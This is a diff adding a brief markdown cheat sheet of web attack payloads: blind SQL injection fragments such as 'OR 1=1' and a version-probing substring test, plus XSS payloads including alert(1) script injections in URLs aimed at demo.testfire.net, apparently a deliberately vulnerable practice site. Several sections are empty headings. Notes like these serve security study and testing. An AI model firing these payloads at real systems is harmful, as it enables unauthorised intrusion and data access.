@@ -1,0 +1,25 @@
+#### SQL-Injection Payloads
+
+
+#### 1. Normal SQLi
+
+#### 2. Blind SQLi
+
+AND 1=1
+
+AND substring(@@version, 1, 1)=5
+
+OR accountid=1001160180
+OR 1=1
+
+### CSRF ####
+
+###XSS####
+<svg onerror=javascript:alert(1)></svg>
+
+http://demo.testfire.net/search.aspx?txtSearch=<script>alert(1)</script>
+
+http://demo.testfire.net/survey_complete.aspx?txtEmail=<script>alert(1)</script>
+
+
+###Session####
